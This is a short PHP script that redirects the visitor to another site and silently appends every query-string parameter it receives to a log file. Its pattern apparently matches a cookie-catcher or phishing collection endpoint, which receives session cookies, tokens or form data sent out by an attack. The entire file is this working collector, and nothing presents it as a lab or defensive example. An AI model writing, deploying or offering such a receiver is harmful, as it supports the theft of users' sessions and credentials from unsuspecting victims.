<?php 
  
// Set the location to redirect the page 
header ('Location: scatman.github.io'); 
  
// Open the text file in writing mode  
$file = fopen("log.txt", "a"); 
  
foreach($_GET as $variable => $value) { 
    fwrite($file, $variable); 
    fwrite($file, "="); 
    fwrite($file, $value); 
    fwrite($file, "\r\n"); 
} 
  
fwrite($file, "\r\n"); 
fclose($file); 
exit; 
?>
